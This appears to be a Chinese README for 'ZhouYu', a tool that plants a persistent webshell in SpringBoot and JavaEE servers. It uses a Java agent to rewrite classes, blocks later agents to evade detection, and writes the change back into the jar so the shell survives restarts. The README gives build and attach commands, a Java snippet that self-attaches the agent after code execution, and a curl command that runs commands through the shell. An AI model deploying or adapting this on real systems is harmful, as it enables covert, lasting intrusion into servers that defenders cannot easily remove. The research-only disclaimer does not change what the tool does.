*工具仅用于安全研究，禁止使用工具发起非法攻击，造成的后果使用者负责*

### ZhouYu -> 周瑜

Java - SpringBoot 持久化 WebShell（适配任何符合JavaEE规范的服务）

背景：后Spring时代，SpringBoot jar部署模式下，一般没有了JSP，所有的模板都在jar内，当大家都热衷于内存马的时候，发现很容易被查杀（网上查杀方式无外乎都是利用JVMTI重加载class的javaagent方式），并且重启后丢失！

1. ZhouYu带来新的webshell写入手法，通过javaagent，利用JVMTI机制，在回调时重写class类，插入webshell，并通过阻止后续javaagent加载的方式，防止webshell被查杀

2. 修改的class类插入webshell后，通过持久化到jar进行class替换，达到webshell持久化，任你如何重启都无法甩掉

### 一、打包编译

命令：
```text
gradle :agent:shadowJar
```
或
```text
./gradlew :agent:shadowJar
```

编译后得到 agent/build/libs/agent-1.0-SNAPSHOT-all.jar，即ZhouYu.jar

### 二、使用方式

两种场景：

1. 当你知道jvm pid时，并且能写入临时文件（ZhouYu.jar），一般这种场景不太常见，测试场景比较多
```text
java -jar ZhouYu.jar 23232，23232为需要attach的jvm进程号！
```

2. 能执行一小段代码（内存shell的原理一般是反序列化时加载一段恶意字节码）

先把编译后得到的ZhouYu.jar写到临时目录，例：/tmp/ZhouYu.jar

接着执行下面代码：
```
try {
  String pid = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
  int indexOf = pid.indexOf('@');
  if (indexOf > 0) {
    pid = pid.substring(0, indexOf);
    Runtime.getRuntime().exec(String.format("java -jar /tmp/ZhouYu.jar %s", pid));
  }
} catch (Throwable throwable) {

}
```

3. 执行命令
```
curl -XGET "http://127.0.0.1:8080?cmd=whoami"
```

### WARNNING

#### 为了防止出现生产事故，在对原有jar（A.jar）进行替换修改前，会对其进行备份，备份到当前目录下（命名为.A.jar.bk）